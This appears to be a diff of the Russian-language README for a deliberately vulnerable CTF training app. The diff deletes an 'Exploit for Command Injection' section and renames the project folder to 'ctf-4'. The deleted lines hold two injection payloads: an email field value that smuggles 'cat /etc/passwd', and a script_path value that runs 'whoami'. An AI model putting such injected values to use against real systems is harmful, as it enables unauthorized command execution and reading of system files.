@@ -40,17 +40,6 @@ encoded_payload = base64.b64encode(payload).decode()
 
 print(encoded_payload)
 ```
-
-### Эксплойт для Command Injection
-
-```python
-# Через поле email
-email = 'test@test.com"; cat /etc/passwd #'
-
-# Через script_path (требует контроля над объектом)
-script_path = '/tmp/file; whoami > /tmp/hacked #'
-```
-
 ## 🛠️ Установка и запуск
 
 ### Локальная разработка
@@ -58,7 +47,7 @@ script_path = '/tmp/file; whoami > /tmp/hacked #'
 ```bash
 # Клонирование репозитория
 git clone <repository-url>
-cd techlaunch-vulnerable
+cd ctf-4
 
 # Установка зависимостей
 pip install -r requirements.txt
